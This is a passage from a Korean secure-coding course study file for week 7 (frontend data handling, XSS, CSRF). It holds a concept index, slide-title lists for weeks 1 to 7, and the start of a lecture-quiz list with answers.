# WEEK07 — 7주차 프론트엔드 데이터 처리 / XSS / CSRF (시큐어코딩 중간고사 주차 묶음)

> 이 파일 하나에 7주차의 교안 퀴즈(1-QUESTIONS, 신뢰도 A) · 정리(4-NOTES, C~D) · 교안 원문(2-SLIDES, A) · 강의 발화(3-TRANSCRIPT, B)가 모두 있다.
> 위치 표기 규칙은 전체 파일과 같다: `[2-SLIDES] N주차 M차시 p.X` = 교안, `[N주차 M차시 mm:ss]` = 발화, `[1-QUESTIONS] N주차 M차시 퀴즈 K` = 퀴즈.
> 맨 앞의 찾아보기(0-INDEX)는 1~7주차 전체 지도다. 다른 주차 개념이면 그 주차 파일(weekNN.md)을 봐야 한다.

---

# 0-INDEX — 찾아보기 (먼저 여기를 본다)

> 개념 → 어느 파일/주차에 있는지. 표에서 위치를 확인한 뒤 해당 파일을 검색하면 빠름.
> 파일 신뢰도: 1-QUESTIONS(A·퀴즈) · 2-SLIDES(A·교안) · 3-TRANSCRIPT(B·발화) · 4-NOTES(C~D·AI정리)

주차 요약: 1주차 보안약점과 시큐어코딩 개요 / 2주차 SW개발보안 방법론·위협 모델링 / 3주차 Spring Boot 개발 환경·실습 / 4주차 정규식과 입력값 검증·XSS 필터 / 5주차 인증과 인가 · OAuth2 · JWT / 6주차 ORM·MyBatis / SQL 인젝션 / Command 인젝션 / 7주차 프론트엔드 데이터 처리 / XSS / CSRF

| 개념 | 검색 표기 | 교안(2-SLIDES) 주차-차시 | 발화(3-TRANSCRIPT) 주차 |
|---|---|---|---|
| 보안약점 | 보안약점, Weakness, CWE, 취약점 | 1-1, 1-2, 1-3, 2-1, 2-2, 2-3, 3-1, 3-2, 3-3, 4-1, 4-2, 4-3, 5-1, 5-2, 5-3, 6-1, 6-2, 6-3, 7-1, 7-2, 7-3 | 1, 2, 3, 4, 5, 6, 7 |
| SQL 인젝션 | SQL Injection, SQL 인젝션, SQL 삽입, 에스큐엘 인젝션 | 1-1, 1-2, 1-3, 2-1, 4-1, 4-3, 6-1, 6-2, 6-3, 7-2 | 1, 2, 4, 6, 7 |
| PreparedStatement | PreparedStatement, 프리페어드 스테이트먼트, 파라미터 바인딩, 바인딩 | 6-1, 6-2, 7-1, 7-2 | 3, 5, 6, 7 |
| XSS | XSS, Cross-Site Scripting, 크로스사이트 스크립팅, 크로스 사이트 스크립팅 | 1-1, 1-3, 2-1, 2-3, 3-1, 4-1, 4-3, 5-1, 5-2, 5-3, 7-1, 7-2, 7-3 | 1, 2, 3, 4, 5, 6, 7 |
| Reflected XSS | Reflected XSS, 반사형 XSS, 리플렉티드 | 7-2 | 7 |
| Stored XSS | Stored XSS, 저장형 XSS, 스토어드 | 7-2, 7-3 | 7 |
| DOM XSS | DOM XSS, DOM 기반 XSS, 돔 기반, document.write | 7-1, 7-2 | 7 |
| CSRF | CSRF, Cross-Site Request Forgery, 크로스사이트 요청 위조, 크로스 사이트 요청 위조 | 1-2, 1-3, 5-1, 7-2, 7-3 | 1, 5, 7 |
| Command 인젝션 | Command Injection, 커맨드 인젝션, 명령어 삽입, 명령 삽입 | 1-2, 1-3, 4-1, 6-3, 7-1 | 1, 4, 6 |
| CSP | CSP, Content Security Policy, 콘텐츠 보안 정책, 컨텐츠 시큐리티 폴리시 | 1-2, 1-3, 5-2, 7-1, 7-2 | 1, 5, 7 |
| SameSite | SameSite, 세임사이트, Strict, Lax | 1-3, 5-1, 5-3, 7-1, 7-2, 7-3 | 1, 3, 5, 7 |
| HTML 인코딩 | HTML Encoding, HTML 인코딩, 이스케이프, Escape | 1-1, 2-3, 3-3, 5-1, 5-2, 5-3, 6-1, 6-2, 6-3, 7-1, 7-2 | 1, 2, 3, 4, 5, 6, 7 |
| 화이트리스트 | 화이트리스트, Whitelist, 최소 허용, 허용 목록 | 1-3, 6-2, 6-3, 7-1, 7-3 | 1, 6, 7 |
| ORM | ORM, Object-Relational Mapping, 객체 관계 매핑, JPA | 1-1, 1-3, 2-2, 2-3, 3-1, 3-2, 3-3, 4-3, 5-2, 6-1, 6-2, 6-3, 7-2, 7-3 | 1, 2, 3, 4, 5, 6 |
| MyBatis | MyBatis, 마이바티스, Mapper, 매퍼 | 5-2, 6-1, 6-2 | 4, 5, 6 |
| Dirty Checking | Dirty Checking, 더티 체킹, 변경 감지 | 6-1 | 6 |
| Mass Assignment | Mass Assignment, 대량 할당, DTO, isAdmin | 1-3, 3-3, 6-1 | 1, 3, 6 |
| 인증 | Authentication, 인증, 로그인 | 1-1, 1-2, 1-3, 2-1, 2-2, 2-3, 3-1, 3-2, 4-3, 5-1, 5-2, 5-3, 6-2, 7-1, 7-2, 7-3 | 1, 2, 3, 4, 5, 6, 7 |
| 인가 | Authorization, 인가, 권한, RBAC | 1-1, 1-2, 1-3, 2-2, 2-3, 3-1, 4-3, 5-1, 5-2, 5-3, 6-1, 6-2, 6-3, 7-1, 7-2, 7-3 | 1, 2, 3, 4, 5, 6, 7 |
| 세션 | Session, 세션, JSESSIONID, 세션 쿠키 | 1-1, 1-2, 1-3, 2-1, 2-2, 2-3, 3-1, 4-1, 4-2, 4-3, 5-1, 5-2, 5-3, 6-1, 6-2, 6-3, 7-1, 7-2, 7-3 | 1, 2, 3, 4, 5, 6, 7 |
| 토큰 | Token, 토큰, Bearer, 베어러 | 1-1, 1-3, 2-3, 5-1, 5-2, 5-3, 7-1, 7-2, 7-3 | 1, 2, 3, 5, 7 |
| OAuth2 | OAuth2, OAuth 2.0, 오아스, 권한 위임 | 1-3, 2-3, 3-1, 5-2, 5-3, 6-1, 6-2, 7-2, 7-3 | 1, 2, 3, 5, 6, 7 |
| JWT | JWT, JSON Web Token, 제이더블유티, Claims | 1-3, 5-1, 5-2, 5-3 | 1, 5 |
| Refresh Token | Refresh Token, 리프레시 토큰, 토큰 회전, Rotation | 5-2, 5-3 | 5 |
| MFA | MFA, Multi-Factor, 다중 인증, 다중 매체 인증 | 1-1, 1-3, 2-2, 5-1 | 1, 2, 5 |
| HSTS | HSTS, HTTP Strict-Transport-Security, 스트릭트 트랜스포트 | 5-1 | 5 |
| IDOR | IDOR, Insecure Direct Object References, 직접 객체 참조, 수평 권한 | 1-1, 1-3, 2-2, 2-3, 5-1, 6-2, 7-1 | 1, 2, 5 |
| 정규식 | Regex, 정규식, Regular Expression, Pattern | 4-1, 4-2, 4-3, 5-2, 6-3, 7-1, 7-2, 7-3 | 4, 6, 7 |
| ReDoS | ReDoS, 레도스, 백트래킹, Backtracking | 4-2 | 4 |
| Filter | Filter, 필터, Interceptor, 인터셉터 | 1-3, 2-2, 2-3, 3-2, 4-1, 4-2, 4-3, 5-1, 5-2, 6-1, 6-2, 6-3, 7-1, 7-2, 7-3 | 1, 2, 3, 4, 5, 6, 7 |
| 위협 모델링 | Threat Modeling, 위협 모델링, STRIDE, 스트라이드 | 1-1, 1-2, 1-3, 2-1, 2-2, 2-3, 3-1, 3-2, 4-2, 4-3, 5-1, 5-2, 5-3, 6-1, 6-2, 6-3, 7-1, 7-2, 7-3 | 1, 2, 3, 4, 5 |
| SSR/CSR | SSR, CSR, Server-Side Rendering, Client-Side Rendering | 1-1, 1-3, 4-3, 5-1, 7-1, 7-2, 7-3 | 1, 4, 5, 7 |
| 로컬 저장소 | localStorage, sessionStorage, 로컬 저장소, 로컬 스토리지 | 5-1, 5-2, 5-3, 7-1 | 5, 7 |
| CORS | CORS, 코어스, Cross-Origin, 교차 출처 | 4-3, 7-1 | 4, 7 |
| SQLMap | SQLMap, 에스큐엘맵 | 6-2 | - |
| ZAP | ZAP, OWASP ZAP, Active Scan, Burp | 1-1, 3-1, 5-1, 6-2, 6-3, 7-1 | 1, 3, 4, 5, 6 |
| 코드 리뷰 | 코드 리뷰, Code Review, SAST, DAST | 1-1, 1-3, 2-1, 2-2, 6-2, 6-3, 7-1 | 1, 2, 6, 7 |

## [0-INDEX] 교안 쪽 제목 목록 (626쪽 전체) — 문제의 핵심어를 여기서 먼저 찾는다
> 같은 제목이 이어지면 쪽 범위로 묶음. 제목에 없어도 본문에 있을 수 있으니, 여기 없으면 2-SLIDES 본문을 핵심어로 다시 검색한다.

### [0-INDEX] 1주차 1차시 교안 제목 — 보안약점과 시큐어코딩 개요
p.1 시큐어코딩
p.2 SW개발보안 이해
p.3 학습 목표
p.4 학습 내용
p.5 SW개발보안 이해
p.6~7 데이터 유출현황 및 침해발생 원인
p.8 현대 애플리케이션의 보안 과제 (출처: 라드웨어 애플리케이션 보호 위한
p.9 애플리케이션 보안 과제는 어떻게 해결해야 할까?
p.10 애플리케이션 보안(1)
p.11 SW개발보안 프로세스
p.12 DevOps환경에서의 DevSecOps (그림출처: 가트너)
p.13~16 DevSecOps AWS 아키텍쳐
p.17 애플리케이션 보안(2)
p.18~19 Security By Design – Threat Modeling
p.20 애플리케이션 보안(3)
p.21 제로 트러스트 보안 모델
p.22 SW개발보안 이해
p.23 시큐어한 소프트웨어란?
p.24~27 개발자의 사소한 실수 -
p.28~29 소프트웨어 보안취약점 사례 – OSS( ) 취약점 공격
p.30 소프트웨어 보안취약점 사례 – 공급망 해킹
p.31 소프트웨어 보안 취약점 사례 – 공급망 보안
p.32 요약 정리
p.33 참고 문헌
p.34 감사합니다.
p.35 퀴즈
p.36 퀴즈 정답

### [0-INDEX] 1주차 2차시 교안 제목 — 보안약점과 시큐어코딩 개요
p.1 시큐어코딩
p.2 SW개발보안 국내기준
p.3 학습 목표
p.4 학습 내용
p.5 SW개발보안 국내기준
p.6~9 행정안전부 SW개발보안 가이드
p.10 행정안전부 개발보안 가이드
p.11 국내 SW개발보안 제도(과학기술정보통신부)
p.12 SW개발보안 국내기준
p.13 클라우드서비스(SaaS) 보안 인증
p.14 클라우드 보안인증 통제항목 [SaaS 표준등급]
p.15 SaaS CSAP 기술적 보호조치 (★ ISMS 인증시 점검대체 가능 항
p.16 SaaS CSAP 기술적 보호조치
p.17 요약 정리
p.18 참고 문헌
p.19 감사합니다.
p.20 퀴즈
p.21 퀴즈 정답

### [0-INDEX] 1주차 3차시 교안 제목 — 보안약점과 시큐어코딩 개요
p.1 시큐어코딩
p.2 SW개발보안 국외기준
p.3 학습 목표
p.4 학습 내용
p.5 SW개발보안 국외기준
p.6~8 국외 개발보안 현황
p.9 SW개발보안 국외기준
p.10~11 OWASP TOP 10
p.12~21 OWASP TOP 10 2021
p.22 OWASP API Security Risk TOP 10
p.23~28 OWASP API Security Risk TOP 10 2023
p.29 OWASP API Security Risk TOP 10
p.30~32 OWASP API Security Risk TOP 10 2023
p.33 OWASP Mobile Risk TOP 10
p.34 SW개발보안 국외기준
p.35 CVE 취약점 DB활용(http://cve.mitre.org)
p.36 CVE 작동 방식
p.37 CVE 예제
p.38 CVE 와 소프트웨어 개발보안
p.39 SW개발보안 국외기준
p.40 CWE 취약점 DB활용(http://cwe.mitre.org)
p.41 CWE와 CVE의 차이점
p.42 CWE TOP 25
p.43 CWE TOP 25 선정 목적 및 활용 방안
p.44~45 2023 CWE TOP 25 (https://cwe.mitre.org/t
p.46 요약 정리
p.47 참고 문헌
p.48 감사합니다.
p.49 퀴즈
p.50 퀴즈 정답

### [0-INDEX] 2주차 1차시 교안 제목 — SW개발보안 방법론·위협 모델링
p.1 시큐어코딩
p.2 SW개발보안 방법론
p.3 학습 목표
p.4 학습 내용
p.5~7 SW개발보안 방법론
p.8 SW개발보안 적용 시 비용 효과
p.9 SW개발보안 방법론 적용의 중요성
p.10 SW개발보안 방법론
p.11~18 소프트웨어 개발보안 적용 우수사례 MS-SDL
p.19 요약 정리
p.20 참고 문헌
p.21 감사합니다.
p.22 퀴즈
p.23 퀴즈 정답

### [0-INDEX] 2주차 2차시 교안 제목 — SW개발보안 방법론·위협 모델링
p.1 시큐어코딩
p.2 위협모델링 개요
p.3 학습 목표
p.4 학습 내용
p.5 위협모델링 개요
p.6 위협모델링(Threat Modeling) 이란?
p.7 위협모델링(Threat Modeling)의 핵심 목표
p.8 위협모델링(Threat Modeling)이 중요한 이유
p.9 위협모델링(Threat Modeling) 참가자 및 역할 (1)
p.10 위협모델링(Threat Modeling) 참가자 및 역할 (2)
p.11 위협모델링(Threat Modeling) 흐름
p.12 위협모델링(Threat Modeling) 프레임워크
p.13 위협모델링 프레임워크 - STRIDE
p.14 위협모델링 프레임워크 – DREAD
p.15 위협모델링 프레임워크 – DREAD 세부 점수 기준 예시
p.16 위협모델링 프레임워크 – DREAD 총점 기준에 따른 위협 수준
p.17 위협모델링 프레임워크 – DREAD 평가 예시
p.18 위협모델링 개요
p.19 위협모델링 프레임워크 프로세스
p.20 위협모델링 프로세스 – 시스템 정의(Define the System)
p.21 위협모델링 프로세스 – 위협 식별(Identify Threats) [Id
p.22 위협모델링 프로세스 – 완화 계획 수립(Mitigate Threats)
p.23 위협모델링 프로세스 – 검토 및 개선(Validate & Review)
p.24 MS-SDL 위협모델링 프로세스 요약
p.25 요약 정리
p.26 참고 문헌
p.27 감사합니다.
p.28 퀴즈
p.29 퀴즈 정답

### [0-INDEX] 2주차 3차시 교안 제목 — SW개발보안 방법론·위협 모델링
p.1 위협모델링 실무 적용
p.2 학습 목표
p.3 학습 내용
p.4 위협모델링 실무 적용
p.5 위협모델링 도구 선정 기준
p.6 위협모델링 도구들
p.7 위협모델링 도구들 – 도구 선정 가이드
p.8 MTMT(Microsoft Threats Modeling Tool)
p.9 위협모델링 실무 적용
p.10 위협모델링 실무 적용 실습
p.11 1단계: 시스템 이해 및 범위 정의
p.12 1단계: 시스템 이해 및 범위 정의 - DFD 그리기
p.13 2단계: STRIDE 위협 도출 — 게시글 작성 기능에 대한 STRIDE
p.14 3단계: DREAD 위험도 평가 — 게시글 작성 기능에서 도출된 위협들에
p.15 4단계: 위협 완화 및 대응 전략 수립 — 도출된 위협 내용들을 완화할
p.16 5단계: 보안 검증 및 지속적인 개선
p.17 [개별 실습] 댓글 작성 기능 위협모델링 분석 준비
p.18 요약 정리
p.19 참고 문헌
p.20 감사합니다.
p.21 퀴즈
p.22 퀴즈 정답

### [0-INDEX] 3주차 1차시 교안 제목 — Spring Boot 개발 환경·실습
p.1 실습환경 구축-1
p.2 학습 목표
p.3 학습 내용
p.4 실습환경 구축-1
p.5 실습환경 아키텍처 이해
p.6 실습환경 구축 – 웹 서비스 서버 설정 (1/8)
p.7 실습환경 구축 – 웹 서비스 서버 설정 (2/8)
p.8 실습환경 구축 – 웹 서비스 서버 설정 (3/8)
p.9 실습환경 구축 – 웹 서비스 서버 설정 (4/8)
p.10 실습환경 구축 – 웹 서비스 서버 설정 (5/8)
p.11 실습환경 구축 – 웹 서비스 서버 설정 (6/8)
p.12 실습환경 구축 – 웹 서비스 서버 설정 (7/8)
p.13 실습환경 구축 – 웹 서비스 서버 설정 (8/8)
p.14 실습환경 구축 – 프록시 설정(1/4)
p.15 실습환경 구축 – 프록시 설정(2/4)
p.16 실습환경 구축 – 프록시 설정(3/4)
p.17 실습환경 구축 – 프록시 설정(4/4)
p.18 실습환경 구축 – 파이어폭스 브라우저 설정(1/3)
p.19 실습환경 구축 – 파이어폭스 브라우저 설정(2/3)
p.20 실습환경 구축 – 파이어폭스 브라우저 설정(3/3)
p.21 실습환경 구축 – BurpSuite 프록시 서버 동작
p.22 실습환경 구축-1
p.23 웹 구조
p.24 웹 서비스 흐름
p.25 HTTP 구조
p.26 HTTP 구조 — HTTP 흐름 이해
p.27 BurpSuite을 활용한 HTTP 구조 보기
p.28 HTTP Request 메시지 구조
p.29 HTTP Request Method
p.30 HTTP Response 메시지 구조
p.31~33 HTTP Response Status Code
p.34 실습환경 구축-1
p.35 데이터 인코딩 개요
p.36 03 데이터 인코딩
p.37 URL 인코딩
p.38 URL 인코딩이 필요한 문자 목록
p.39~42 BurpSuite를 통해 BASE64 디코딩
p.43~44 BurpSuite를 통해 URL인코딩/디코딩
p.45 요약 정리
p.46 참고 문헌
p.47 감사합니다.
p.48 퀴즈
p.49 퀴즈 정답

### [0-INDEX] 3주차 2차시 교안 제목 — Spring Boot 개발 환경·실습
p.1 실습환경 구축-2
p.2 학습 목표
p.3 학습 내용
p.4 실습환경 구축-2
p.5~7 프레임워크(Framework)와 플랫폼(Platform) 개념 및 차이
p.8 Spring Boot 프레임워크란?
p.9 Spring Boot vs. Spring Framework
p.10~17 Spring Boot 기본 사용법
p.18 시연 영상
p.19 요약 정리
p.20 참고 문헌
p.21 감사합니다.
p.22 퀴즈
p.23 퀴즈 정답

### [0-INDEX] 3주차 3차시 교안 제목 — Spring Boot 개발 환경·실습
p.1 실습환경 구축-3
p.2 학습 목표
p.3 학습 내용
p.4 실습환경 구축-3
p.5~6 Spring Boot을 이용한 간단한 게시판 만들기 — Step 1. 설
p.7~15 Spring Boot을 이용한 간단한 게시판 만들기
p.16 시연 영상
p.17 요약 정리
p.18 참고 문헌
p.19 감사합니다.
p.20 퀴즈
p.21 퀴즈 정답

### [0-INDEX] 4주차 1차시 교안 제목 — 정규식과 입력값 검증·XSS 필터
p.1 정규식 기본문법
p.2 학습 목표
p.3 학습 내용
p.4 정규식 기본 문법
p.5~6 정규식이란?
p.7 정규식 활용 사례
p.8 정규식 문자 다루기 — 문자 다루기
p.9 정규식 문자 다루기 — 기본 문자 클래스 (Character Class)
p.10 정규식 기본 문법
p.11 반복 다루기 — 반복 메타문자
p.12 반복 다루기 — 실무 활용 예시
p.13 정규식 기본 문법
p.14 문자열 다루기
p.15 문자열 다루기 — 자주 사용되는 정규식
p.16 정규식 시각적 이해
p.17 요약 정리
p.18 참고 문헌
p.19 감사합니다.
p.20 퀴즈
p.21 퀴즈 정답

### [0-INDEX] 4주차 2차시 교안 제목 — 정규식과 입력값 검증·XSS 필터
p.1 정규식 활용한 데이터 검증
p.2 학습 목표
p.3 학습 내용
p.4 정규식 활용한 데이터 검증
p.5 grep 명령어에서 정규식 사용
p.6 grep 명령어에서 정규식 사용 — grep 명령어에서 자주 사용하는 옵
p.7 grep 명령어에서 정규식 사용
p.8 sed 명령어에서 정규식 사용
p.9 sed 명령어에서 정규식 사용 — sed 명령어에서 자주 사용하는 명령어
p.10 sed 명령어에서 정규식 사용
p.11 awk 명령어에서 정규식 사용
p.12 awk 명령어에서 정규식 사용 — awk의 주요 변수
p.13 awk 명령어에서 정규식 사용
p.14 정규식 활용한 데이터 검증
p.15~19 자바 프로그램에서 정규식 사용
p.20~24 정규식 사용 시 문제점
p.25 요약 정리
p.26 참고 문헌
p.27 감사합니다.
p.28 퀴즈
p.29 퀴즈 정답

### [0-INDEX] 4주차 3차시 교안 제목 — 정규식과 입력값 검증·XSS 필터
p.1 정규식을 활용한 입력값 필터링
p.2 학습 목표
p.3 학습 내용
p.4 정규식을 활용한 입력값 필터링
p.5 필터(Filter)란?
p.6 Spring Boot Filter 구조
p.7~9 Spring Boot 에서 필터 구현 방법
p.10 Spring Security 와 기본 필터
p.11~13 입력값 필터 만들기
p.14 입력값 필터 만들기 — 정규식을 이용한 입력값 필터링 정책
p.15~16 LAB1 - 소스코드의 XSS 취약점 확인
p.17~20 LAB2 - 소스코드에 XSS 필터 반영
p.21 LAB3 - 소스코드에서 XSS 필터 동작 확인
p.22 시연 영상
p.23 요약 정리
p.24 참고 문헌
p.25 감사합니다.
p.26 퀴즈
p.27 퀴즈 정답

### [0-INDEX] 5주차 1차시 교안 제목 — 인증과 인가 · OAuth2 · JWT
p.1 인증과 인가 기초
p.2 학습 목표
p.3 학습 내용
p.4 인증과 인가 기초
p.5 인증과 인가의 차이
p.6 인증 방식 이해
p.7 인증 방식 이해 – 지식기반 인증
p.8 인증 방식 이해 – 소유기반 인증
p.9 인증 방식 이해 – 생체기반 인증
p.10 보안강화를 위한 최신 인증 기술
p.11 인증과 인가 기초
p.12 일반적인 웹 애플리케이션의 인증/인가 프로세스
p.13 세션 기반 인증
p.14~15 LAB 세션 처리 확인
p.16 토큰 기반 인증
p.17~18 JWT 로그인 세션 처리 확인
p.19 인증과 인가 기초
p.20 주요 인증 보안 위협
p.21 주요 인증 보안 위협 대응 방안
p.22 주요 인가 보안 위협
p.23 주요 인가 보안 위협 대응 방안
p.24 요약 정리
p.25 참고 문헌
p.26 감사합니다.
p.27 퀴즈
p.28 퀴즈 정답

### [0-INDEX] 5주차 2차시 교안 제목 — 인증과 인가 · OAuth2 · JWT
p.1 OAuth2 인증 및 인가
p.2 학습 목표
p.3 학습 내용
p.4 OAuth2 인증 및 인가
p.5 OAuth2 란?
p.6 OAuth2 주요 구성요소
p.7 OAuth2 구성 요소
p.8~9 OAuth2 인증 흐름 : Authorization Code Grant
p.10~11 OAuth2 의 장단점
p.12 OAuth 와 OAuth2 비교
p.13 OAuth2 인증 및 인가
p.14~23 Google OAuth 클라이언트 생성
p.24~29 Authorization Code 발급
p.30 Access Token 발급
p.31 Resource Server에서 유저정보 받기
p.32 유저 정보를 토대로 계정 연동
p.33 OAuth2를 통한 로그인 성공 화면
p.34 OAuth2 인증 및 인가
p.35 OAuth2 구현시 발생할 수 있는 취약점
p.36 Access Token 유출 방지 전략
p.37 요약 정리
p.38 참고 문헌
p.39 감사합니다.
p.40 퀴즈
p.41 퀴즈 정답

### [0-INDEX] 5주차 3차시 교안 제목 — 인증과 인가 · OAuth2 · JWT
p.1 JWT 인증 및 인가
p.2 학습 목표
p.3 학습 내용
p.4 JWT 인증 및 인가
p.5 JWT(JSON Web Token) 이란?
p.6 JWT의 구성 및 동작 방식
p.7 JWT의 장점
p.8 JWT의 단점
p.9~11 JWT 기반 인증 흐름
p.12 JWT 인증 및 인가
p.13 JWT 구현 실습
p.14 프로젝트 환경 설정
p.15 JWT 컨트롤러 소스코드 (1/4)
p.16 JWT 컨트롤러 소스코드 (2/4)
p.17 JWT 컨트롤러 소스코드 (3/4)
p.18 JWT 컨트롤러 소스코드 (4/4)
p.19 구현된 JWT 기능 테스트 (1/3)
p.20 구현된 JWT 기능 테스트 (2/3)
p.21 구현된 JWT 기능 테스트 (3/3)
p.22 JWT 인증 및 인가
p.23~24 JWT 보안 및 취약점 대응 – 서명과 키 관리
p.25 JWT 보안 및 취약점 대응 – 유효기간 관리
p.26 JWT 보안 및 취약점 대응 – JWT 탈취
p.27 요약 정리
p.28 참고 문헌
p.29 감사합니다.
p.30 퀴즈
p.31 퀴즈 정답

### [0-INDEX] 6주차 1차시 교안 제목 — ORM·MyBatis / SQL 인젝션 / Command 인젝션
p.1 ORM 프레임워크 이해와 활용
p.2 학습 목표
p.3 학습 내용
p.4 ORM 프레임워크 이해와 활용
p.5 ORM(Object-Relational Mapping) 의 정의와 필요성
p.6 전통적인 SQL 쿼리 vs ORM 방식 비교 – 정의와 특징
p.7 전통적인 SQL 쿼리 vs ORM 방식 비교 – 장점과 단점
p.8 전통적인 SQL 쿼리 vs ORM 방식 비교
p.9~11 ORM이 제공하는 주요 기능
p.12 ORM 프레임워크 이해와 활용
p.13 MyBatis 프레임워크 - 개요
p.14 MyBatis 프레임워크 – 주요 기능
p.15 MyBatis 프레임워크 – 설정 및 구성
p.16 MyBatis 프레임워크 사용 예시 (1/3)
p.17 MyBatis 프레임워크 사용 예시 (2/3)
p.18 MyBatis 프레임워크 사용 예시 (3/3)
p.19 MyBatis 프레임워크 – 장단점 및 사례
p.20 ORM 프레임워크 이해와 활용
p.21 ORM 프레임워크와 보안 개요
p.22 SQL 인젝션 및 동적 쿼리 취약점
p.23 캐싱 및 지연 로딩 관련 보안 이슈
p.24 매핑, 설정 및 권한 관리 취약점
p.25 요약 정리
p.26 참고 문헌
p.27 감사합니다.
p.28 퀴즈
p.29 퀴즈 정답

### [0-INDEX] 6주차 2차시 교안 제목 — ORM·MyBatis / SQL 인젝션 / Command 인젝션
p.1 SQL 인젝션 진단 및 대응
p.2 학습 목표
p.3 학습 내용
p.4 SQL 인젝션 취약점 진단 및 대응
p.5~6 SQL 인젝션 개요
p.7~9 SQL 인젝션 취약점 발생 원인
p.10 SQL 인젝션 취약점 공격 방식
p.11 Error-based SQL 인젝션 (오류 기반 SQL 인젝션)
p.12~13 Union-based SQL 인젝션 (유니온 기반 SQL 인젝션)
p.14 Blind SQL 인젝션 (블라인드 SQL 인젝션)
p.15 SQL 인젝션 공격 보안 사고 사례
p.16 SQL 인젝션 취약점 진단 및 대응
p.17~18 SQL인젝션 취약점 진단 방법 – 코드리뷰
p.19 SQL인젝션 취약점 진단 방법 – 자동화된 진단 도구 활용
p.20~26 SQL인젝션 취약점 대응 방법 – 시큐어코딩 적용
p.27 SQL인젝션 취약점 대응 방법 – 입력 값 검증
p.28~29 SQL인젝션 취약점 대응 방법 – 보안 로그 기록 및 모니터링
p.30 요약 정리
p.31 참고 문헌
p.32 감사합니다.
p.33 퀴즈
p.34 퀴즈 정답

### [0-INDEX] 6주차 3차시 교안 제목 — ORM·MyBatis / SQL 인젝션 / Command 인젝션
p.1 Command 인젝션 취약점 진단 및 대응
p.2 학습 목표
p.3 학습 내용
p.4 Command 인젝션 취약점 진단 및 대응
p.5~6 Command 인젝션이란?
p.7 운영체제별 명령어 실행 방식 이해 - Windows
p.8 운영체제별 명령어 실행 방식 이해 - Linux
p.9 Command 인젝션 취약점 진단 및 대응
p.10~12 Command 인젝션 취약점 진단 - 수동진단
p.13~14 Command 인젝션 취약점 진단 – 자동화도구 활용
p.15~17 Command 인젝션 대응 – 시큐어코딩 적용
p.18 Command 인젝션 대응 – 시스템 보호 전략
p.19 요약 정리
p.20 참고 문헌
p.21 감사합니다.
p.22 퀴즈
p.23 퀴즈 정답

### [0-INDEX] 7주차 1차시 교안 제목 — 프론트엔드 데이터 처리 / XSS / CSRF
p.1 프론트엔드 데이터 처리
p.2 학습 목표
p.3 학습 내용
p.4 프론트엔드 데이터 처리
p.5 클라이언트/서버 구조
p.6 프론트엔드의 역할
p.7~10 프론트엔드에서 입력 데이터 처리 방식
p.11 프론트엔드 데이터 처리
p.12~13 DOM 기반 보안 문제
p.14 JavaScript 실행 환경에서의 보안 문제
p.15~16 로컬 저장소의 보안 문제
p.17~18 보안에 취약한 API 호출 방식
p.19 프론트엔드 데이터 처리
p.20~22 사용자 입력 값 검증 및 필터링
p.23~24 CSP(Content Security Policy) 적용
p.25 요약 정리
p.26 참고 문헌
p.27 감사합니다.
p.28 퀴즈
p.29 퀴즈 정답

### [0-INDEX] 7주차 2차시 교안 제목 — 프론트엔드 데이터 처리 / XSS / CSRF
p.1 XSS 취약점 진단 및 대응
p.2 📌
p.3 📍
p.4 XSS 취약점 진단 및 대응
p.5 XSS(크로스 사이트 스크립팅) 이란?
p.6 XSS 취약점 공격 흐름
p.7 XSS 취약점 유형
p.8 XSS 취약점 공격 피해
p.9 XSS 취약점 진단 및 대응
p.10~12 XSS 공격 유형 및 기법 – Reflected XSS
p.13~15 XSS 공격 유형 및 기법 – Stored XSS
p.16~18 XSS 공격 유형 및 기법 – DOM 기반 XSS
p.19 사고 사례
p.20 XSS 취약점 진단 및 대응
p.21~22 입출력 값 검증 및 필터링
p.23~25 HTML 엔티티 이스케이프 처리
p.26 Spring Web MVC에서 입출력 필터링
p.27~28 CSP(Content-Security-Policy) 적용
p.29 요약 정리
p.30 참고 문헌
p.31 감사합니다.
p.32 퀴즈
p.33 퀴즈 정답

### [0-INDEX] 7주차 3차시 교안 제목 — 프론트엔드 데이터 처리 / XSS / CSRF
p.1 CSRF 취약점 진단 및 대응
p.2 학습 목표
p.3 학습 내용
p.4 CSRF 취약점 진단 및 대응
p.5 CSRF(크로스 사이트 요청 위조)란?
p.6 CSRF 취약점 발생 원인
p.7~8 CSRF 취약점 공격 흐름
p.9 CSRF와 XSS의 차이점
p.10 CSRF 공격 사고 사례
p.11 CSRF 취약점 진단 및 대응
p.12~14 CSRF 공격 기법
p.15~16 CSRF 공격이 가능한 취약한 웹 사이트
p.17 CSRF 취약점 진단 및 대응
p.18~19 CSRF 토큰 적용 및 활용
p.20~21 SameSite Cookie 정책 설정
p.22 Origin/Referer 검증 및 세션 관리 보안 강화
p.23 요약 정리
p.24 참고 문헌
p.25 감사합니다.
p.26 퀴즈
p.27 퀴즈 정답

## [0-INDEX] 교안 퀴즈 문항 목록 (63문제) — 시험 문제와 겹치는지 먼저 본다
- [1-QUESTIONS] 1주차 1차시 퀴즈 1 — 다음 중 SW개발보안 프로세스에 해당하지 않는 것은? → 정답 4) 배포
- [1-QUESTIONS] 1주차 1차시 퀴즈 2 — 제품의 설계단계에서부터 보안을 고려하여 알려진 취약점을 조기에 효과적으로 제거하는 것을 의미하는 것은? → 정답 2) 보안내재화
- [1-QUESTIONS] 1주차 1차시 퀴즈 3 — 다음 중 '오버플로우'에 대한 설명이 맞는 것은? → 정답 2) 연산 결과가 허용할 수 있는 범위를 벗어남
- [1-QUESTIONS] 1주차 2차시 퀴즈 1 — 다음 중 행정안전부 SW개발보안 가이드와 관련 없는 내용은? → 정답 3) 테스트 단계부터 SW개발 보안을 적용하기 위한 기준
- [1-QUESTIONS] 1주차 2차시 퀴즈 2 — 다음 중 클라우드 서비스 보안 인증과 관련하여, 소프트웨어 보안과 관련된 통제 항목이 아닌 것은? → 정답 4) 개발 조직의 신원 관리 및 통제
- [1-QUESTIONS] 1주차 2차시 퀴즈 3 — 다음 중 클라우드 서비스 보안 인증을 나타내는 용어는? → 정답 1) CSAP
- [1-QUESTIONS] 1주차 3차시 퀴즈 1 — 다음 중 '취약한 접근 통제' 취약점에 대한 설명이 맞는 것은? → 정답 1) 인증된 사용자가 접근이 제한된 데이터나 기능에 접근 가능
- [1-QUESTIONS] 1주차 3차시 퀴즈 2 — 다음 중 '인젝션 공격'에 대한 설명으로 틀린 것은? → 정답 3) 커맨드 인젝션 방어를 위해 Prepared Statement를 사용
